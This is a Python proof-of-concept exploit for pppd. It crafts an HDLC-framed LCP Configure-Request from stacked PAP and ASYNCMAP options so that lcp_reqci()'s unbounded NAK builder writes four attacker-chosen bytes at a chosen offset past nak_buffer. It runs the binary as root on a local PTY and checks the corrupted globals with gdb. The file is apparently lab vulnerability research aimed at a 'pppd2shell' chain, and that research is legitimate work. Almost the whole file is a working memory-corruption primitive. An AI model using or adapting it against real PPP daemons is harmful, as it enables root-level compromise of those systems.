#!/usr/bin/env python3
"""Local-only chosen-value write primitive on the vulnerable live pppd.

Builds one LCP Configure-Request from repeated PAP and ASYNCMAP CIs so that
lcp_reqci()'s unbounded NAK builder places four attacker-chosen bytes at an
absolute global offset. Starts the pinned binary as root on a local PTY with
`escape 00`, which sets lcp_allowoptions[0].asyncmap = 1, so each ASYNCMAP CI
with bit 0 clear is NAKed with ao->asyncmap | cilong. After the frame, attaches
gdb to the live process and reads the globals. No external connection.
"""
import argparse
import fcntl
import json
import os
import pty
import select
import struct
import subprocess
import sys
import termios
import time
from pathlib import Path

ROOT = Path(__file__).resolve().parent
LOGDIR = ROOT / "raw"
LOGDIR.mkdir(exist_ok=True)
SECRETS = Path("/run/pppd2shell-live/chap-secrets")


def fcs16(data: bytes) -> int:
    f = 0xFFFF
    for b in data:
        f ^= b
        for _ in range(8):
            f = (f >> 1) ^ 0x8408 if f & 1 else f >> 1
    return f ^ 0xFFFF


def stuff(data: bytes) -> bytes:
    out = bytearray()
    for b in data:
        if b < 0x20 or b in (0x7E, 0x7D):
            out += bytes((0x7D, b ^ 0x20))
        else:
            out.append(b)
    return bytes(out)


def hdlc(info: bytes) -> bytes:
    core = bytes((0xFF, 0x03)) + struct.pack("!H", 0xC021) + info
    f = fcs16(core)
    return b"\x7e" + stuff(core + bytes((f & 0xFF, f >> 8))) + b"\x7e"


def set_raw(fd: int) -> None:
    attrs = termios.tcgetattr(fd)
    attrs[0] = 0
    attrs[1] = 0
    attrs[3] = 0
    attrs[6][termios.VMIN] = 1
    attrs[6][termios.VTIME] = 0
    termios.tcsetattr(fd, termios.TCSANOW, attrs)


def frame_for(target: int, value: int) -> tuple[bytes, dict]:
    """Place four value bytes at nak_buffer+target in the NAK stream.

    PAP NAKs are 5 bytes, ASYNCMAP NAKs 6. Solve 5*pad + 6*count = target-2
    for the CIs preceding the last ASYNCMAP NAK, whose four value bytes then
    land at `target`. The CI value has bit 0 clear; ao->asyncmap=1 sets it.
    """
    assert target >= 4
    value &= 0xFFFFFFFF
    ci_value = value & ~1
    assert value == (ci_value | 1), "ao->asyncmap=1 forces bit 0 of the NAK value"
    pad = next(p for p in range(6) if (target - 2 - 5 * p) % 6 == 0)
    # Body length is target+4-pad; PPP_MRU allows at most 1500 bytes of info.
    while target + 4 - pad > 1496:
        pad += 6
    count = (target - 2 - 5 * pad) // 6
    assert count >= 0
    pap = bytes((3, 4, 0xC0, 0x23))
    async_ci = bytes((2, 6)) + struct.pack("!I", ci_value)
    body = pap * pad + async_ci * (count + 1)
    info = struct.pack("!BBH", 1, 1, 4 + len(body)) + body
    layout = {
        "target_offset": target,
        "pap_cis": pad,
        "async_cis": count + 1,
        "info_len": len(info),
        "nak_bytes": 5 * pad + 6 * (count + 1),
        "ci_value": f"{ci_value:08x}",
        "expected_nak_value": f"{value:08x}",
    }
    return hdlc(info), layout


def find_pid(binary: str, slave_name: str) -> int | None:
    out = subprocess.run(["sudo", "-n", "pgrep", "-f", Path(binary).name],
                         capture_output=True, text=True).stdout.split()
    for pid in out:
        try:
            if Path(f"/proc/{pid}/comm").read_text().strip() != "pppd":
                continue
            cmdline = Path(f"/proc/{pid}/cmdline").read_bytes()
        except OSError:
            continue
        if slave_name.encode() in cmdline:
            return int(pid)
    return None


def gdb_read(pid: int, target: int) -> str:
    cmds = [
        "set pagination off",
        f"x/8xb &nak_buffer[{target - 8}]",
        f"x/4xb &nak_buffer[{target}]",
        "x/16xb &ifname[0]",
        "x/gx &the_channel",
        "print/x lcp_allowoptions[0].asyncmap",
        "detach",
    ]
    args = ["sudo", "-n", "gdb", "-q", "-batch", "-p", str(pid)]
    for cmd in cmds:
        args += ["-ex", cmd]
    return subprocess.run(args, capture_output=True, text=True, timeout=30).stdout


def drain(fd: int, proc: subprocess.Popen, seconds: float) -> bytearray:
    out = bytearray()
    deadline = time.monotonic() + seconds
    while time.monotonic() < deadline:
        r, _, _ = select.select([fd], [], [], 0.1)
        if r:
            try:
                chunk = os.read(fd, 65536)
            except (BlockingIOError, OSError):
                chunk = b""
            if chunk:
                out += chunk
        if proc.poll() is not None:
            break
    return out


def run(a: argparse.Namespace) -> int:
    frame, layout = frame_for(a.target, int(a.value, 16))
    (LOGDIR / f"{a.tag}-frame.bin").write_bytes(frame)
    secrets_local = LOGDIR / "chap-secrets"
    secrets_local.write_text('"labserver"\t*\t"labsecret"\t*\n'
                             '"labpeer"\t*\t"labsecret"\t*\n')
    subprocess.run(["sudo", "-n", "mkdir", "-p", str(SECRETS.parent)], check=True)
    subprocess.run(["sudo", "-n", "install", "-o", "root", "-g", "root",
                    "-m", "0600", str(secrets_local), str(SECRETS)], check=True)
    master, slave = pty.openpty()
    set_raw(slave)
    slave_name = os.ttyname(slave)
    log_path = LOGDIR / f"{a.tag}-pppd.log"
    env = dict(os.environ)
    env["ASAN_OPTIONS"] = "detect_leaks=0"
    cmd = [
        "sudo", "-n", "env", "ASAN_OPTIONS=detect_leaks=0", a.binary,
        "nodetach", "passive", "local", "refuse-pap", "refuse-eap",
        "noip", "noipv6", "noproxyarp", "nolock", "debug",
        "escape", "00", "chap-secrets", str(SECRETS), "name", "labserver",
        slave_name,
    ]
    with open(log_path, "wb") as log:
        proc = subprocess.Popen(cmd, stdin=subprocess.DEVNULL, stdout=log,
                                stderr=subprocess.STDOUT, env=env,
                                close_fds=True)
    os.close(slave)
    fcntl.fcntl(master, fcntl.F_SETFL, os.O_NONBLOCK)
    heard = drain(master, proc, a.ready)
    (LOGDIR / f"{a.tag}-early.bin").write_bytes(bytes(heard))
    os.write(master, frame)
    after = drain(master, proc, a.hold)
    (LOGDIR / f"{a.tag}-reply.bin").write_bytes(bytes(after))
    rc = proc.poll()
    pid = find_pid(a.binary, slave_name)
    gdb_out = ""
    if pid is not None:
        try:
            gdb_out = gdb_read(pid, a.target)
        except (subprocess.TimeoutExpired, OSError) as exc:
            gdb_out = f"gdb failed: {exc}\n"
    (LOGDIR / f"{a.tag}-gdb.txt").write_text(gdb_out)
    if rc is None:
        proc.terminate()
        try:
            proc.wait(timeout=3)
        except subprocess.TimeoutExpired:
            proc.kill()
            proc.wait(timeout=3)
    os.close(master)
    summary = {
        "tag": a.tag,
        "binary": a.binary,
        "pppd_pid": pid,
        "process_rc": rc,
        "survived_window": rc is None or rc == 0,
        **layout,
        "gdb_output": gdb_out,
    }
    (LOGDIR / f"{a.tag}-summary.json").write_text(json.dumps(summary, indent=2))
    print(json.dumps({k: v for k, v in summary.items() if k != "gdb_output"},
                     indent=2))
    print(gdb_out)
    return 0


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--binary", required=True)
    ap.add_argument("--target", type=int, default=1500)
    ap.add_argument("--value", default="50574e33")
    ap.add_argument("--ready", type=float, default=2.0)
    ap.add_argument("--hold", type=float, default=1.0)
    ap.add_argument("--tag", required=True)
    return run(ap.parse_args())


if __name__ == "__main__":
    sys.exit(main())
